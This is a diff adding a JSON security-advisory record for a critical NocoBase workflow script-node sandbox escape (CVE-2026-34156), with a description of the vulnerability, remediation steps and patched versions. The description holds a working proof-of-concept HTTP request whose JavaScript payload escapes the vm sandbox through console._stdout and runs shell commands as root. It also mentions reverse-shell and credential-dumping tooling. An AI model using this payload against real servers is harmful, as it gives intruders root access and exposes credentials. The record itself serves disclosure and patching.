@@ -1,0 +1,50 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-03-30T17:16:25Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@nocobase/plugin-workflow-javascript"
+  },
+  "Advisory": {
+    "DatabaseId": 345939,
+    "Id": "GSA_kwCzR0hTQS1weDNwLXZnaDktbTU3Y84ABUdT",
+    "GhsaId": "GHSA-px3p-vgh9-m57c",
+    "References": [
+      {
+        "Url": "https://github.com/nocobase/nocobase/security/advisories/GHSA-px3p-vgh9-m57c"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-px3p-vgh9-m57c"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-px3p-vgh9-m57c"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-34156"
+      }
+    ],
+    "Description": "`##` Summary\n\nNocoBase's Workflow Script Node executes user-supplied JavaScript inside a Node.js `vm` sandbox with a custom `require` allowlist (controlled by `WORKFLOW_SCRIPT_MODULES` env var). However, the `console` object passed into the sandbox context exposes host-realm `WritableWorkerStdio` stream objects via `console._stdout` and `console._stderr`.\n\nAn authenticated attacker can traverse the prototype chain to escape the sandbox and achieve Remote Code Execution (RCE) as root.\n\n## Exploit Chain\n\n1. `console._stdout.constructor.constructor` → host-realm `Function` constructor\n2. `Function('return process')()` → Node.js `process` object\n3. `process.mainModule.require('child_process')` → unrestricted module loading\n4. `child_process.execSync('id')` → RCE as root\n\nThis completely bypasses the `customRequire` allowlist.\n\n## Impact\n\n- Remote Code Execution as root (uid=0) inside Docker container\n- Database credential theft (`DB_PASSWORD`, `INIT_ROOT_PASSWORD` from `process.env`)\n- Arbitrary file read/write via `require('fs')`\n- Reverse shell confirmed\n- Outbound network access for lateral movement\n\n## Proof of Concept\n\n**HTTP Request:**\n\nPOST /api/flow_nodes:test\nAuthorization: Bearer \u003cJWT_TOKEN\u003e\nContent-Type: application/json\n\n{\n  \"type\": \"script\",\n  \"config\": {\n    \"content\": \"const Fn=console._stdout.constructor.constructor;const proc=Fn('return process')();const cp=proc.mainModule.require('child_process');return cp.execSync('id').toString().trim();\",\n    \"timeout\": 5000,\n    \"arguments\": []\n  }\n}\n\n**Response:**\n\n{\"data\":{\"status\":1,\"result\":\"uid=0(root) gid=0(root) groups=0(root)\",\"log\":\"\"}}\n\n## Environment\n\n- Docker image: `nocobase/nocobase:latest`\n- NocoBase CLI: v2.0.26\n- Node.js: v20.20.1\n- OS: Debian GNU/Linux 12 (bookworm)\n\n## PoC\n\nGot reverse shell\n\n\u003cimg width=\"1300\" height=\"743\" alt=\"Screenshot 2026-03-26 at 06 09 51\" src=\"https://github.com/user-attachments/assets/fcb65346-2d98-485a-a849-153d5957c78e\" /\u003e\n\nProof of concept the root privileges\n\n\u003cimg width=\"1292\" height=\"515\" alt=\"Screenshot 2026-03-26 at 06 12 29\" src=\"https://github.com/user-attachments/assets/599cd915-d5e9-47b6-9ddb-655ae4f22d50\" /\u003e\n\nos-release demonstration\n\n\u003cimg width=\"1290\" height=\"523\" alt=\"Screenshot 2026-03-26 at 06 12 54\" src=\"https://github.com/user-attachments/assets/48030450-f2b1-4edc-a7f0-caafbf55dd00\" /\u003e\n\n\u003cimg width=\"1296\" height=\"516\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f7012c09-885b-48fb-a6d4-7282c0326d0b\" /\u003e\n\nApp path\n\n\u003cimg width=\"1295\" height=\"516\" alt=\"Screenshot 2026-03-26 at 06 14 04\" src=\"https://github.com/user-attachments/assets/b4846af8-cb10-4c2a-886f-b19a120c2245\" /\u003e\n\n## Exploit Usage:\n\nReverse Shell Mode\n\n\u003cimg width=\"1299\" height=\"523\" alt=\"tool1\" src=\"https://github.com/user-attachments/assets/6c26d6f3-0ad2-4a61-9692-b150409ee569\" /\u003e\n\nDump system information \u0026 creds\n\n\u003cimg width=\"635\" height=\"591\" alt=\"tool2\" src=\"https://github.com/user-attachments/assets/08dbc231-d686-4536-8a74-272ceb5c10a8\" /\u003e\n\nRemote Command Execution Mode\n\n\u003cimg width=\"644\" height=\"467\" alt=\"tool3\" src=\"https://github.com/user-attachments/assets/fc95d89b-eff5-4eec-87b4-f6022778feec\" /\u003e\n\n\n\n## Remediation\n\n1. Replace Node.js `vm` module with `isolated-vm` for true V8 isolate separation\n2. Do not pass the host `console` object into the sandbox; create a clean proxy\n3. Run the application as a non-root user inside Docker\n4. Restrict `/api/flow_nodes:test` to admin-only roles\n\n## Alternative Escape Vectors\n\n- `console._stderr.constructor.constructor` (identical chain via stderr)\n- `Error.prepareStackTrace` + `CallSite.getThis()` (V8 CallSite API)\n\n## Reporter\n\nOnurcan Genç — Independent Security Researcher, Bilkent University",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-03-30T17:16:24Z",
+    "Severity": "CRITICAL",
+    "Summary": "NocoBase Affected by Sandbox Escape to RCE via console._stdout Prototype Chain Traversal in Workflow Script Node",
+    "UpdatedAt": "2026-03-30T17:16:25Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.0.28"
+      },
+      "VulnerableVersionRange": "\u003c= 2.0.27"
+    }
+  ]
+}
